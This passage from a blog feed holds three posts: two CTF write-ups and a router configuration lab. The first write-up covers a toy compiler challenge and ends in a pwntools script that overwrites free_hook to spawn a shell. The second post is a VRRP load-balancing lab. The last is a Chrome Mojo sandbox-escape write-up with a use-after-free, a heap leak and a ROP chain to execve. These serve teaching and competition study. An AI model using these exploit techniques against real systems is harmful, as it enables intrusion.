line;</span><br><span class="line">            i--;</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125; else if (code[i] == &#x27; &#x27; || code[i] == &#x27;\t&#x27;) &#123; // space or tab?</span><br><span class="line">        &#125; else if (code[i] == &#x27;#&#x27;) &#123; // comment?</span><br><span class="line">            <span class="keyword">for</span> (i++; code[i] != <span class="string">&#x27;\n&#x27;</span>; i++) &#123; &#125; line++;</span><br><span class="line">        &#125; else if (code[i] == &#x27;&quot;&#x27;) &#123; // string?</span><br><span class="line">            strcpy(tok.tok[tok.pos].val, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            tok.tok[tok.pos++].nline = line;</span><br><span class="line">            <span class="keyword">for</span> (i++; code[i] != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; code[i] != <span class="string">&#x27;\0&#x27;</span>; i++)</span><br><span class="line">                strncat(tok.tok[tok.pos].val, &amp;(code[i]), <span class="number">1</span>);</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            <span class="keyword">if</span> (code[i] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">                error(<span class="string">&quot;%d: expected expression &#x27;\&quot;&#x27;&quot;</span>,</span><br><span class="line">                      tok.tok[tok.pos].nline);</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code[i] == <span class="string">&#x27;\n&#x27;</span> ||</span><br><span class="line">                   (is_crlf = (code[i] == <span class="string">&#x27;\r&#x27;</span> &amp;&amp; code[i + <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>))) &#123;</span><br><span class="line">            i += is_crlf;</span><br><span class="line">            strcpy(tok.tok[tok.pos].val, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">            tok.tok[tok.pos].nline = line++;</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            strncat(tok.tok[tok.pos].val, &amp;(code[i]), <span class="number">1</span>); // &lt; -- crash</span><br><span class="line">            <span class="keyword">if</span> (code[i + <span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span> || (code[i] == <span class="string">&#x27;+&#x27;</span> &amp;&amp; code[i + <span class="number">1</span>] == <span class="string">&#x27;+&#x27;</span>) ||</span><br><span class="line">                (code[i] == <span class="string">&#x27;-&#x27;</span> &amp;&amp; code[i + <span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">                strncat(tok.tok[tok.pos].val, &amp;(code[++i]), <span class="number">1</span>);</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    tok.tok[tok.pos].nline = line;</span><br><span class="line">    tok.size = tok.pos - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体原因没有细究，这个地方的洞品相不佳，我们又去挖别的洞。</p><h2 id="2-格式化字符串漏洞"><a href="#2-格式化字符串漏洞" class="headerlink" title="2.格式化字符串漏洞"></a>2.格式化字符串漏洞</h2><p>然后我们又看到一个格式化字符串漏洞，位置在它现实的printf处，它直接把我们的参数传给了libc的printf没有做任何校验：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">static std_function stdfunc[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;Array&quot;</span>, <span class="number">1</span>, <span class="number">12</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;rand&quot;</span>, <span class="number">0</span>, <span class="number">16</span>&#125;, &#123;<span class="string">&quot;printf&quot;</span>, -<span class="number">1</span>, <span class="number">20</span>&#125;, &#123;<span class="string">&quot;sleep&quot;</span>, <span class="number">1</span>, <span class="number">28</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;fopen&quot;</span>, <span class="number">2</span>, <span class="number">32</span>&#125;, &#123;<span class="string">&quot;fprintf&quot;</span>, -<span class="number">1</span>, <span class="number">36</span>&#125;, &#123;<span class="string">&quot;fclose&quot;</span>, <span class="number">1</span>, <span class="number">40</span>&#125;, &#123;<span class="string">&quot;fgets&quot;</span>, <span class="number">3</span>, <span class="number">44</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;free&quot;</span>, <span class="number">1</span>, <span class="number">48</span>&#125;, &#123;<span class="string">&quot;freeLocal&quot;</span>, <span class="number">0</span>, <span class="number">52</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> make_stdfunc(char *name)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; sizeof(stdfunc) / sizeof(stdfunc[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strcmp(stdfunc[i].name, name)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!strcmp(name, <span class="string">&quot;Array&quot;</span>)) &#123;</span><br><span class="line">                // [...]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (stdfunc[i].args == -<span class="number">1</span>) &#123; // vector</span><br><span class="line">                    // [...]</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="built_in">int</span> arg = <span class="number">0</span>; arg &lt; stdfunc[i].args; arg++) &#123;</span><br><span class="line">                        relExpr();</span><br><span class="line">                        emit(<span class="number">0x89</span>); emit(<span class="number">0x44</span>); emit(<span class="number">0x24</span>); emit(arg * <span class="number">4</span>);</span><br><span class="line">                            // mov [esp+arg*<span class="number">4</span>], eax</span><br><span class="line">                        skip(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                emit(<span class="number">0xff</span>); emit(<span class="number">0x56</span>); emit(stdfunc[i].addr); // &lt; -- 直接call printf</span><br><span class="line">                    // call $function</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以直接利用，效果如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/82675864.png"></p><p>由于程序开启了PIE，我们需要泄露地址，这个格式化字符串漏洞不好泄漏地址，我们转而去看其它洞。<br>继续观察stdlib.c文件，发现它实现的array可以直接泄露地址+任意内存读写=。=：</p><h2 id="3-Array处逻辑漏洞"><a href="#3-Array处逻辑漏洞" class="headerlink" title="3.Array处逻辑漏洞"></a>3.Array处逻辑漏洞</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">static std_function stdfunc[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;Array&quot;</span>, <span class="number">1</span>, <span class="number">12</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;rand&quot;</span>, <span class="number">0</span>, <span class="number">16</span>&#125;, &#123;<span class="string">&quot;printf&quot;</span>, -<span class="number">1</span>, <span class="number">20</span>&#125;, &#123;<span class="string">&quot;sleep&quot;</span>, <span class="number">1</span>, <span class="number">28</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;fopen&quot;</span>, <span class="number">2</span>, <span class="number">32</span>&#125;, &#123;<span class="string">&quot;fprintf&quot;</span>, -<span class="number">1</span>, <span class="number">36</span>&#125;, &#123;<span class="string">&quot;fclose&quot;</span>, <span class="number">1</span>, <span class="number">40</span>&#125;, &#123;<span class="string">&quot;fgets&quot;</span>, <span class="number">3</span>, <span class="number">44</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;free&quot;</span>, <span class="number">1</span>, <span class="number">48</span>&#125;, &#123;<span class="string">&quot;freeLocal&quot;</span>, <span class="number">0</span>, <span class="number">52</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> make_stdfunc(char *name)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; sizeof(stdfunc) / sizeof(stdfunc[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strcmp(stdfunc[i].name, name)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!strcmp(name, <span class="string">&quot;Array&quot;</span>)) &#123;</span><br><span class="line">                relExpr(); // get array size</span><br><span class="line">                emit(<span class="number">0xc1</span>); emit(<span class="number">0xe0</span> + EAX); emit(<span class="number">2</span>); // shl eax <span class="number">2</span></span><br><span class="line">                emit(<span class="number">0x89</span>); emit(<span class="number">0x04</span>); emit(<span class="number">0x24</span>); // mov [esp], eax</span><br><span class="line">                emit(<span class="number">0xff</span>); emit(<span class="number">0x56</span>); emit(<span class="number">12</span>); // call malloc</span><br><span class="line">                emit(<span class="number">0x50</span> + EAX); // push eax</span><br><span class="line">                emit(<span class="number">0x89</span>); emit(<span class="number">0x04</span>); emit(<span class="number">0x24</span>); // mov [esp], eax</span><br><span class="line">                emit(<span class="number">0xff</span>); emit(<span class="number">0x56</span>); emit(<span class="number">24</span>); // call add_mem</span><br><span class="line">                emit(<span class="number">0x58</span> + EAX); // pop eax</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>拿到ubuntu 18.04的libc；<br>直接用泄露出的malloc的地址拿到libc基址；<br>写free_hook为system；<br>发送”/bin/sh”get shell；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;./src/rubi&#x27;, &#x27;./poc.rb&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nc chall.0ops.sjtu.edu.cn 20202</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.0ops.sjtu.edu.cn&#x27;</span>, <span class="number">20202</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&lt;xxx.rb&gt;`.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x = [3]</span></span><br><span class="line"><span class="string">a:string = Array(100)</span></span><br><span class="line"><span class="string">a[x - a - 503040 + 1939664] = x - 503040 + 250448</span></span><br><span class="line"><span class="string">free(&quot;/bin/sh&quot;)&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2699390719.png"></p><p>综上这就是一道大水题，但是我们把它做的很麻烦，并且还被flag嘲讽了一波=。=</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VRRP多网关实现负载均衡</title>
      <link href="2020/09/27/VRRP%E5%A4%9A%E7%BD%91%E5%85%B3%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
      <url>2020/09/27/VRRP%E5%A4%9A%E7%BD%91%E5%85%B3%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="VRRP简介"><a href="#VRRP简介" class="headerlink" title="VRRP简介"></a>VRRP简介</h2><blockquote><p>介绍VRRP的定义和作用。</p></blockquote><h3 id="01-定义"><a href="#01-定义" class="headerlink" title="01 定义"></a>01 定义</h3><p>虚拟路由冗余协议VRRP（Virtual Router Redundancy Protocol）通过把几台路由设备联合组成一台虚拟的路由设备，将虚拟网关设备的IP地址作为用户的默认网关实现与外部网络通信。当网关设备发生故障时，VRRP机制能够选举新的网关设备承担数据流量，从而保障网络的可靠通信。</p><h3 id="02-目的"><a href="#02-目的" class="headerlink" title="02 目的"></a>02 目的</h3><p>随着网络的快速普及和相关应用的日益深入，各种增值业务（如IPTV、视频会议等）已经开始广泛部署，基础网络的可靠性日益成为用户关注的焦点，能够保证网络传输不中断对于终端用户非常重要。</p><p>通常，同一网段内的所有主机上都存在一条相同的、以网关为下一跳的缺省路由。主机发往其他网段的报文将通过缺省路由发往网关，再由网关进行转发，从而实现主机与外部网络的通信。当网关发生故障时，本网段内所有以网关为缺省路由的主机将无法与外部网络通信。增加出口网关是提高系统可靠性的常见方法，此时如何在多个出口之间进行选路就成为需要解决的问题。</p><p>VRRP的出现很好的解决了这个问题。VRRP能够在不改变组网的情况下，采用将多台路由设备组成一个虚拟路由器，通过配置虚拟路由器的IP地址为默认网关，实现默认网关的备份。当网关设备发生故障时，VRRP机制能够选举新的网关设备承担数据流量，从而保障网络的可靠通信。</p><h3 id="03-受益"><a href="#03-受益" class="headerlink" title="03 受益"></a>03 受益</h3><p>在具有多播或广播能力的局域网（如以太网）中，借助VRRP能在网关设备出现故障时仍然提供高可靠的缺省链路，无需修改主机及网关设备的配置信息便可有效避免单一链路发生故障后的网络中断问题。</p><h2 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/323009249.png"></p><h2 id="实验计划"><a href="#实验计划" class="headerlink" title="实验计划"></a>实验计划</h2><p>PC1和PC2通过Switch双归属到AR1和AR2。用户希望PC1以PC1为默认网关接入Internet，AR2作为备份网关；PC2以AR2为默认网关接入Internet，AR1作为备份网关，以实现流量的负载均衡。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.设置各设备接口的ip地址</span><br><span class="line"></span><br><span class="line">2.用OSPF连通各设备</span><br><span class="line"></span><br><span class="line">3.20.1.1.0&#x2F;24导入OSPF</span><br><span class="line"></span><br><span class="line">4.设置VRRP</span><br><span class="line"></span><br><span class="line">5.检验</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/984846336.png"></p><p>Vrrp vrid 1 virtual-ip表明组1的虚拟路由器的地址（PC1的网关） vrrp 1 proirity 120设置优先级，成为组1的master。</p><p>Vrrp vrid 1 preempt-mode timer delay 20 抢占时间20s</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4005734468.png"></p><p>AR3: 设置OSPF后，再把直连路由引入</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3461446210.png"></p><p>查看AR1的vrrp，可以看到AR1在备份组1中作为Master设备，在备份组2中作为Backup设备。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3629781823.png"></p><p>查看AR2的vrrp，可以看到AR2在备份组2中作为Master设备，在备份组1中作为Backup设备。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3457383146.png"></p><p>关闭AR1后：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3410325565.png"></p><p>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">AR1:</span><br><span class="line">interface GigabitEthernet&#x2F;0&#x2F;1</span><br><span class="line">ip address 192.168.1.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;0</span><br><span class="line">ip address 10.1.1.1 255.255.255.0</span><br><span class="line">vrrp vrid 1 virtual-ip 10.1.1.111</span><br><span class="line">vrrp vrid 1 priority 120</span><br><span class="line">vrrp vrid 1 preempt-mode timer delay 20</span><br><span class="line">vrrp vrid 2 virtual-ip 10.1.1.112</span><br><span class="line">#</span><br><span class="line">ospf 1</span><br><span class="line">area 0.0.0.0</span><br><span class="line">network 192.168.1.0 0.0.0.255</span><br><span class="line">network 10.1.1.0 0.0.0.255</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AR2:</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;1</span><br><span class="line">ip address 192.168.2.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;0</span><br><span class="line">ip address 10.1.1.2 255.255.255.0</span><br><span class="line">vrrp vrid 1 virtual-ip 10.1.1.111</span><br><span class="line">vrrp vrid 2 virtual-ip 10.1.1.112</span><br><span class="line">vrrp vrid 2 priority 120</span><br><span class="line">vrrp vrid 2 preempt-mode timer delay 20</span><br><span class="line">#</span><br><span class="line">ospf 1</span><br><span class="line">area 0.0.0.0</span><br><span class="line">network 192.168.2.0 0.0.0.255</span><br><span class="line">network 10.1.1.0 0.0.0.255</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AR3:</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;0</span><br><span class="line">ip address 192.168.1.2 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;1</span><br><span class="line"></span><br><span class="line">ip address 192.168.2.2 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;2</span><br><span class="line">ip address 20.1.1.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">ospf 1</span><br><span class="line">area 0.0.0.0</span><br><span class="line">network 192.168.1.0 0.0.0.255</span><br><span class="line">network 192.168.2.0 0.0.0.255</span><br><span class="line">network 20.1.1.0 0.0.0.255</span><br><span class="line">#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工程师养成记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探Chrome沙箱逃逸</title>
      <link href="2020/09/24/%E5%88%9D%E6%8E%A2Chrome%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>2020/09/24/%E5%88%9D%E6%8E%A2Chrome%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Background"><a href="#1-Background" class="headerlink" title="1.Background"></a>1.Background</h1><h2 id="Chrome-Security-Architecture"><a href="#Chrome-Security-Architecture" class="headerlink" title="Chrome Security Architecture"></a>Chrome Security Architecture</h2><p>众所周知沙箱是Chrome重要的安全机制，有沙箱就意味着v8、音视频解码等等渲染层的漏洞不能直接打到host上，所以我们想要pwn Chrome至少要两个漏洞，沙箱进程的rce和沙箱逃逸。</p><h2 id="Chrome安全架构如下"><a href="#Chrome安全架构如下" class="headerlink" title="Chrome安全架构如下"></a>Chrome安全架构如下</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2170576533.png"></p><h2 id="Mojo"><a href="#Mojo" class="headerlink" title="Mojo"></a>Mojo</h2><p>Mojo是Chrome新的IPC机制，从Mojo文档中可以看到，Mojo is a collection of runtime libraries providing a platform-agnostic abstraction of common IPC primitives, a message IDL format, and a bindings library with code generation for multiple target languages to facilitate convenient message passing across arbitrary inter- and intra-process boundaries. 目前来看无论是CTF还是Real World中，利用Mojo进行Chrome沙箱逃逸都很常见。</p><hr><h1 id="2-0CTF-TCTF2020-Quals-ChromiumSBX"><a href="#2-0CTF-TCTF2020-Quals-ChromiumSBX" class="headerlink" title="2.0CTF/TCTF2020 Quals ChromiumSBX"></a>2.0CTF/TCTF2020 Quals ChromiumSBX</h1><p>来看这个例子。这是0ctf/tctf 2020 quals的一道浏览器题，通过diff可以看到增加了一个新的mojo service，代码很好理解，是一个storage service。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>通过审计可以发现如下问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void TStorageImpl::Init(InitCallback callback) &#123;</span><br><span class="line">    inner_db_ &#x3D; std::make_unique&lt;InnerDbImpl&gt;();</span><br><span class="line">    &#x2F;&#x2F; Init will release the previous inner_db pointer</span><br><span class="line">    std::move(callback).Run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TStorageImpl::CreateInstance(CreateInstanceCallback callback) &#123;</span><br><span class="line">    mojo::PendingRemote&lt;blink::mojom::TInstance&gt; instance;</span><br><span class="line">    mojo::MakeSelfOwnedReceiver(std::make_unique&lt;content::TInstanceImpl&gt;(inner_db_.get()),</span><br><span class="line">                            instance.InitWithNewPipeAndPassReceiver());</span><br><span class="line">    &#x2F;&#x2F; so inner_db_.get() pointer obtained previously will be freed</span><br><span class="line">    &#x2F;&#x2F; which is UAF</span><br><span class="line">    std::move(callback).Run(std::move(instance));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TStorageImpl::CreateInstance会使用inner_db_.get()将存储在inner_db_内部的指针传递到TInstanceImpl的构造函数中，新的TInstanceImpl实例会将指针存储到其字段中；但是观察TStorageImpl::Init是可以被多次调用的，每次调用它会把前一个对象释放，但前一个对象已经被TInstanceImpl存储，会造成UAF。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h4 id="1-堆喷占位"><a href="#1-堆喷占位" class="headerlink" title="1.堆喷占位"></a>1.堆喷占位</h4><p>漏洞点是一个比较好触发的UAF，首先想到的是去占位，通过调试可以发现InnerDbImpl的大小是0x678，观察一下我们可以控制大小的对象，看到了 <code>base::queue&lt;uint64_t&gt; queue_</code> ，它是stl的容器，通过push和pop可以控制其大小，具体把大小调整到0x678的方法见成功2019的博客，写的很成功我不啰嗦了。</p><blockquote><p>成功2019的博客：<br><a href="https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html">https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html</a></p></blockquote><h4 id="2-泄露堆地址"><a href="#2-泄露堆地址" class="headerlink" title="2.泄露堆地址"></a>2.泄露堆地址</h4><p>为了劫持虚表，我们需要泄露堆地址。我们可以用我们占位成功那个对象来泄露UAF对象的base::queue指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; tInsPtr here is the UAF object</span><br><span class="line">const idx &#x3D; (await tInsPtr.getInt()).value;</span><br><span class="line">print(idx); &#x2F;&#x2F; get which one is occupying the UAF object</span><br><span class="line">for (let i &#x3D; 0; i &lt; 201; i++)</span><br><span class="line">await tInsPtrSprays[idx].pop();</span><br><span class="line">const heapAddr &#x3D; (await tInsPtrSprays[idx].pop()).value;</span><br><span class="line">&#x2F;&#x2F; pop element to leak the address of heap</span><br><span class="line">&#x2F;&#x2F; now 0x678 is freed again due to poping elements</span><br><span class="line">print(hex(heapAddr));</span><br></pre></td></tr></table></figure><h4 id="3-代码执行："><a href="#3-代码执行：" class="headerlink" title="3.代码执行："></a>3.代码执行：</h4><p>基本条件都有了，开始构造rop劫持虚表，参考Plaid CTF mojo题的exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">await tInsPtr.push(libcAddr + 0x52bc8);  &#x2F;&#x2F; pop rbp; pop rbx; ret;</span><br><span class="line">await tInsPtr.push(0);           &#x2F;&#x2F; let queue to have some element</span><br><span class="line">await tInsPtr.push(textAddr + 0x3fa5114); &#x2F;&#x2F; xchg rsp,rax, as virtual table</span><br><span class="line">await tInsPtr.push(libcAddr + 0x2cb49);  &#x2F;&#x2F; pop rbx; ret;</span><br><span class="line">await tInsPtr.push(libcAddr + 0xe4e30);  &#x2F;&#x2F; execve</span><br><span class="line">await tInsPtr.push(libcAddr + 0x1b96);  &#x2F;&#x2F; pop rdx; ret;</span><br><span class="line">await tInsPtr.push(0);           &#x2F;&#x2F; rdx &#x3D; 0</span><br><span class="line">await tInsPtr.push(libcAddr + 0xd1ba7);  &#x2F;&#x2F; lea rdi, [rsp + 0xb0]; mov rsi, rbp; call rbx</span><br></pre></td></tr></table></figure><h3 id="完整exploit"><a href="#完整exploit" class="headerlink" title="完整exploit"></a>完整exploit</h3><blockquote><p>成功2019的exp<br><a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/T20ChromeSBX.html">https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/T20ChromeSBX.html</a></p></blockquote><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>上述基本是一道mojo沙箱逃逸的典型例题，手法和思想都比较经典。解题基本参照2019的思路来的，Perfect Blue这里也有很详细的writeup。</p><blockquote><p>Perfect Blue的博客<br><a href="https://blog.perfect.blue/Chromium-Fullchain">https://blog.perfect.blue/Chromium-Fullchain</a></p></blockquote><p>另外关于Mojo还有一个很经典的漏洞是Issue 1062091，后续文章可能会分析。</p><p>除了Mojo，Android Binder的CVE-2020-0041，Windows内核的CVE-2020-0981等这种也可以被用来逃逸Chrome沙箱。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参考链接：</span><br><span class="line">1.https:&#x2F;&#x2F;theori.io&#x2F;research&#x2F;escaping-chrome-sandbox&#x2F;</span><br><span class="line">2.https:&#x2F;&#x2F;mem2019.github.io&#x2F;jekyll&#x2F;update&#x2F;2020&#x2F;07&#x2F;03&#x2F;TCTF-Chromium-SBX.html</span><br><span 